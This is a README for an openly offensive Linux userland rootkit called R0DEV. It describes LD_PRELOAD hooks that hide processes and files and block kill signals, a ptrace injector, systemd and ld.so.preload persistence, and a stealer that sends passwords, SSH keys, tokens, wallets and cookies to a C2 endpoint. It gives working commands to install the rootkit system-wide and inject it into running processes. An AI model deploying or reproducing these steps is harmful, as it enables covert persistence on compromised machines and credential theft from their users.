# R0DEV — LD_PRELOAD + SO Injection Rootkit

Userland Linux rootkit using `LD_PRELOAD` / `ld.so.preload` for persistence
with runtime SO injection via `ptrace`.

## Components

| File | Purpose |
|---|---|
| `rootkit.c` | LD_PRELOAD shared object — hooks readdir, stat, open, kill, fopen, read |
| `injector.c` | Runtime SO injector — injects rootkit.so into a running process via ptrace |
| `fix_rootkit.c` | Static binary (raw syscall) to remove rootkit |
| `forcekill.c` | Static binary (raw kill syscall) to bypass kill hook |
| `loader.sh` | Persistence script — copies SO and writes ld.so.preload |
| `dropper.sh` | All-in-one deploy script (base64 embeds everything) |
| `R0DEV_controle.service` | Systemd persistence unit |
| `stealer.py` | Data exfiltration tool — cookies, passwords, SSH keys, tokens, wallets, WiFi |

## Build

```bash
make          # builds rootkit.so, fix_rootkit, forcekill, injector
make strip    # strips debug symbols
make clean    # removes binaries
```

## Usage

### Install (system-wide via ld.so.preload)
```bash
sudo ./dropper.sh
```

### Or manually
```bash
sudo cp rootkit.so /lib/x86_64-linux-gnu/security.so
echo /lib/x86_64-linux-gnu/security.so | sudo tee /etc/ld.so.preload
```

### Inject into running process
```bash
./injector <pid> ./rootkit.so
```

## Configuration

- `R0DEV_PREFIX` env var — override the default "r0dev" prefix (case-insensitive)
- `R0DEV_C2` env var — C2 endpoint for stealer.py

## Hide a process

Run any binary with the prefix in its name:
```bash
./r0run.sh /path/to/binary
```

The process will be hidden from `ps`, `ls /proc/`, and protected from `kill`.
Its CPU usage will be subtracted from `/proc/stat`.

## Removal

```bash
sudo ./fix_rootkit
```

## Hooks

| Function | Target | Effect |
|---|---|---|
| `readdir()` | /proc listing | Hides PID dirs + files with prefix |
| `readdir64()` | /proc listing | Same, 64-bit variant |
| `open()` | /proc/stat | Returns memfd with subtracted CPU |
| `openat()` | /proc/stat | Same as open |
| `fopen()` | /proc/stat | Returns modified FILE stream |
| `read()` | Any fd pointing to /proc/stat | Subtracts CPU from buffer |
| `kill()` | SIGKILL/SIGTERM | Blocks signals to hidden processes |
| `stat()` | Any file | Hides files with prefix (ENOENT) |
| `lstat()` | Any file | Hides files with prefix |
| `fstatat()` | Any file | Hides files with prefix |

## License

CC BY-NC-SA 4.0
